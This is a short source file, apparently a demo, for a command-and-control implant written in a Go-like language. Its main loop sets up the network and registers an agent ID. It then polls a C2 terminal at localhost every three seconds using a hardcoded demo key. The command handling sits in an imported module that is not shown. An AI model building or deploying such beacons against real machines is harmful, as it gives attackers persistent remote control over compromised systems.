package main

import (
    "std/runtime"
    "std/file"
    "std/time"
    "std/net"
    "c2"
)

fn main(stackHint: *void) -> u64 {
    if !runtime.Init(stackHint) {
        return 1
    }
    if net.Init() != 0 {
        return 2
    }

    var c2Base: *u8 = "http://127.0.0.1:8080"
    var c2Key: *u8 = "piclang-c2-demo-key"
    var keyLen: u64 = __strlen(c2Key)

    id, err := c2.GetAgentID()
    if err != 0 {
        return 3
    }

    for true {
        c2.PollTerminal(c2Base, id, c2Key, keyLen)
        time.Sleep(3 * time.Second)
    }

    return 0
}
